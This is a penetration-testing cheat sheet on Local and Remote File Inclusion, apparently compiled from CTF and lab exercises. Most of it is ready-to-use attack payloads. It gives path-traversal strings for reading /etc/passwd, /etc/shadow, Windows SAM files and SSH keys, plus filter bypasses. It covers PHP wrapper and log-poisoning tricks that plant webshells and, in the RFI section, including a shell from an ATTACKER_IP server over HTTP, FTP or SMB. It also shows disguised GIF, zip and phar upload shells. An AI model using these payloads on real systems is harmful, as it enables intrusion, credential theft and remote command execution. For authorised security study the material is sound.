# LFI / RFI

## File Inclusion Functions (Read/Execute/Remote)

| Function | Read | Execute | Remote |
|----------|------|---------|--------|
| **PHP** |
| `include()` / `include_once()` | ✅ | ✅ | ✅ |
| `require()` / `require_once()` | ✅ | ✅ | ❌ |
| `file_get_contents()` | ✅ | ❌ | ✅ |
| `fopen()` / `file()` | ✅ | ❌ | ❌ |
| **NodeJS** |
| `fs.readFile()` | ✅ | ❌ | ❌ |
| `res.render()` | ✅ | ✅ | ❌ |
| **Java** |
| `include` | ✅ | ❌ | ❌ |
| `import` | ✅ | ✅ | ✅ |
| **.NET** |
| `@Html.Partial()` | ✅ | ❌ | ❌ |
| `Response.WriteFile()` | ✅ | ❌ | ❌ |
| `include` | ✅ | ✅ | ✅ |

---

## Basic LFI Test Payloads

```bash
# Linux
/etc/passwd
../../../etc/passwd
....//....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Windows
C:\Windows\boot.ini
..\..\..\..\windows\win.ini
```

---

## Directory Traversal

* Even without the ability to upload and execute code, a Local File Inclusion vulnerability can be dangerous.
* An attacker can still perform a Directory Traversal / Path Traversal attack using an LFI vulnerability as follows.

```
http://example.com/?file=../../../../etc/passwd
```

* Testing
* If you see a webpage URL look like this:

```
/script.php?page=index.html 
```

**Basic Linux Test**

Test for:

```
http://example.thm.labs/page.php?file=/etc/passwd 
http://example.thm.labs/page.php?file=../../../../../../etc/passwd 
http://example.thm.labs/page.php?file=../../../../../../etc/passwd%00 
http://example.thm.labs/page.php?file=....//....//....//....//etc/passwd 
http://example.thm.labs/page.php?file=%252e%252e%252fetc%252fpasswd
http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=../../../../../../../../../etc/passwd
http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=../../../../../../../../../var/www/html/wordpress/wp-config.php
http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=../../../../../../../../../var/www/html/wordpress/index.php
```

**When the parameter is prefixed (e.g. `notes=files/...`):** try traversing from the known path. Working patterns:

```
# Known valid: ?notes=files/ninevehNotes.txt
files/ninevehNotes/../../../../../../../etc/passwd
/ninevehNotes/../etc/passwd
```

---

## LFI Bypass Techniques

### Non-Recursive Filter Bypass

If `../` is filtered but not recursively:

```bash
....//....//....//....//etc/passwd
..././..././..././etc/passwd
....\/....\/....\/etc/passwd
```

### URL Encoding

```bash
# Single encoded
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double encoded
%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### Approved Path Bypass

If input must start with approved path:

```bash
./languages/../../../../etc/passwd
```

### Null Byte (PHP < 5.5)

```bash
../../../etc/passwd%00
../../../etc/passwd%00.php
```

### Path Truncation (PHP < 5.3)

```bash
# Generate payload with 4096+ chars
echo -n "../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

---

## PHP Wrappers

### php://filter (Read Source Code)

```bash
# Base64 encode to read PHP source
php://filter/convert.base64-encode/resource=config
php://filter/read=convert.base64-encode/resource=/etc/passwd

# Decode output
echo 'BASE64_STRING' | base64 -d
```

### data:// Wrapper (RCE)

Requires `allow_url_include = On`:

```bash
# Check if enabled
curl "http://TARGET/index.php?page=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
echo 'BASE64' | base64 -d | grep allow_url_include

# Base64 encode webshell
echo '<?php system($_GET["cmd"]); ?>' | base64
# PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==

# Execute
http://TARGET/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

### php://input Wrapper (RCE)

```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://TARGET/index.php?page=php://input&cmd=id"
```

### expect:// Wrapper (RCE)

Requires `expect` extension:

```bash
# Check if installed
echo 'BASE64' | base64 -d | grep expect

# Execute
curl -s "http://TARGET/index.php?page=expect://id"
```

### LFI to RCE via Log Poisoning

* First find the log file path and attempt to `curl` to it

```
user@machine$ curl -A "This is testing" http://10-10-122-235.p.thmlabs.com/login.php
```

* Should see the evidence of your test in the user agent string logged
*

    <figure><img src="https://user-images.githubusercontent.com/75596877/145140973-2ab102e2-f40d-4f16-8a0b-a3582f002d46.png" alt=""><figcaption></figcaption></figure>
* Now post php code to the log file and then visit the log file location to execute the php code you just injected

```
user@machine$ curl -A "<?php phpinfo();?>" http://10-10-122-235.p.thmlabs.com/login.php
```

### **LFI to RCE via PHP Sessions**

* The LFI to RCE via PHP sessions follows the same concept of the log poisoning technique.
* PHP sessions are files within the operating system that store temporary information. After the user logs out of the web application, the PHP session information will be deleted.
* This technique requires enumeration to read the PHP configuration file first, and then we know where the PHP sessions files are.
* Then, we include a PHP code into the session and finally call the file via LFI.
* PHP stores session data in files within the system in different locations based on the configuration. The following are some of the common locations that the PHP stores in:

```
c:\Windows\Temp
/tmp/
/var/lib/php5
/var/lib/php/session
```

* Once the attacker finds where PHP stores the session file and can control the value of their session, the attacker can use it to a chain exploit with an LFI to gain remote command execution.
* To find the PHP session file name, PHP, by default uses the following naming scheme, `sess_<SESSION_ID>` where we can find the `SESSION_ID` using the browser and verifying cookies sent from the server.
* To find the session ID in the browser, you can open the developer tools `(SHIFT+CTRL+I)`, then the Application tab.
* From the left menu, select Cookies and select the target website.
* There is a `PHPSESSID` and the value. In my case, the value is `vc4567al6pq7usm2cufmilkm45`.
* Therefore, the file will be as `sess_vc4567al6pq7usm2cufmilkm45`. Finally, we know it is stored in `/tmp`.
* Now we can use the LFI to call the session file.

```
https://10-10-122-235.p.thmlabs.com/login.php?err=/tmp/sess_vc4567al6pq7usm2cufmilkm45
```

### RCE via SSH

* Try to ssh into the box with a PHP code as username .

```
ssh <?php system($_GET["cmd"]);?>@10.10.10.10
```

* Then include the SSH log files inside the Web Application.

```
http://example.com/index.php?page=/var/log/auth.log&cmd=id
```

### LFI when the parameter has a prefix (e.g. `notes=files/...`)

When the vulnerable parameter is used with a fixed prefix (e.g. `?notes=files/ninevehNotes.txt`), you need to traverse from that path. Probe by changing the value and watching responses:

* **Valid file** – page shows content (no error).
* **Missing file** – PHP warning like `failed to open stream: No such file or directory` (confirms `include()` and path handling).
* **Filtered / no include** – generic message like “No Note is selected.”

**What often does not work:** bare path (`/etc/passwd`), too many `../` (e.g. “File name too long”), or dropping the prefix entirely (“No Note is selected”).

**What often works:** keep a prefix that still looks like a path under the allowed dir, then traverse up:

```text
# Known valid: ?notes=files/ninevehNotes.txt
# Chop extension to see error and confirm include():
?notes=files/ninevehNotes   → Warning: include(files/ninevehNotes): failed to open stream...

# Traverse from the valid path (adjust depth as needed):
?notes=files/ninevehNotes/../../../../../../../etc/passwd   → /etc/passwd
?notes=/ninevehNotes/../etc/passwd                        → /etc/passwd
```

Start with fewer `../` and add more until you hit the root; too many can trigger “File name too long”. Use `view-source:` or curl to confirm you’re reading the real file content.

### RCE via Apache logs

* Poison the User-Agent in access logs:

```bash
curl http://TARGET/ -A "<?php system(\$_GET['cmd']);?>"
```

* Note: The logs will escape double quotes so use single quotes for strings in the PHP payload.
* Then request the logs via the LFI and execute your command.

```bash
curl "http://TARGET/index.php?page=/var/log/apache2/access.log&cmd=id"
```

---

## Remote File Inclusion (RFI)

Requires `allow_url_include = On` (except SMB on Windows).

### Verify RFI

```bash
# Test with local URL first
http://TARGET/index.php?page=http://127.0.0.1:80/index.php
```

### HTTP

```bash
# Create shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Start server
sudo python3 -m http.server 80

# Include
http://TARGET/index.php?page=http://ATTACKER_IP/shell.php&cmd=id
```

### FTP

```bash
# Start FTP server
sudo python -m pyftpdlib -p 21

# Include
http://TARGET/index.php?page=ftp://ATTACKER_IP/shell.php&cmd=id

# With credentials
http://TARGET/index.php?page=ftp://user:pass@ATTACKER_IP/shell.php&cmd=id
```

### SMB (Windows - No allow_url_include needed)

```bash
# Start SMB server
impacket-smbserver -smb2support share $(pwd)

# Include via UNC path
http://TARGET/index.php?page=\\ATTACKER_IP\share\shell.php&cmd=whoami
```

---

## LFI with File Uploads

### GIF Shell

```bash
# Create malicious GIF with PHP code
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif

# Upload, then include
http://TARGET/index.php?page=./uploads/shell.gif&cmd=id
```

### ZIP Wrapper

```bash
# Create PHP shell and zip it
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.jpg shell.php

# Upload shell.jpg, then include
http://TARGET/index.php?page=zip://./uploads/shell.jpg%23shell.php&cmd=id
```

### Phar Wrapper

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

```bash
# Compile and rename
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg

# Upload shell.jpg, then include
http://TARGET/index.php?page=phar://./uploads/shell.jpg%2Fshell.txt&cmd=id
```

#### LFI to RCE via credentials files

* This method require high privileges inside the application in order to read the sensitive files.

**Windows version**

* First extract sam and system files.

```
http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam
http://example.com/index.php?page=../../../../../../WINDOWS/repair/system
```

* Then extract hashes from these files samdump2 SYSTEM SAM > hashes.txt, and crack them with hashcat/john or replay them using the Pass The Hash technique.

**Linux version**

* First extract /etc/shadow files.

```
http://example.com/index.php?page=../../../../../../etc/shadow
```

* Then crack the hashes inside in order to login via SSH on the machine.
* Another way to gain SSH access to a Linux machine through LFI is by reading the private key file, id\_rsa.
* If SSH is active check which user is being used `/proc/self/status` and `/etc/passwd` and try to access `/<HOME>/.ssh/id_rsa`.

---

## Automated LFI Scanning

### Fuzz for Parameters

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
     -u 'http://TARGET/index.php?FUZZ=value' -fs 2287 -ac
```

### Fuzz for LFI

```bash
# Using LFI wordlist
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
     -u 'http://TARGET/index.php?page=FUZZ' -fs 2287 -ac

# wfuzz alternative
wfuzz -u "http://TARGET/index.php?page=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hh 2287

# With cookie
wfuzz -u "http://TARGET/index.php?page=FUZZ" -b "PHPSESSID=abc123" \
      -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
```

### Fuzz for Webroot

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
     -u 'http://TARGET/index.php?page=../../../../FUZZ/index.php' -fs 2287
```

### Fuzz for Server Files

```bash
# Linux
ffuf -w /path/to/LFI-WordList-Linux:FUZZ \
     -u 'http://TARGET/index.php?page=../../../../FUZZ' -fs 2287

# Windows
ffuf -w /path/to/LFI-WordList-Windows:FUZZ \
     -u 'http://TARGET/index.php?page=..\..\..\..\FUZZ' -fs 2287
```

---

## Bypassing Path Normalization

* If you make a request in the browser to:&#x20;

```
https://ip/../../../../../../../../etc/passwd
```

* And you notice when you make the request the website path goes back to:

```
https://ip/
```

* Use Burp Suite repeater to make the request manually&#x20;

```
GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
Host: 10.10.10.184
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: dataPort=6063
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Content-type: 
Content-Length: 92
Connection: close
AuthInfo: 

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```
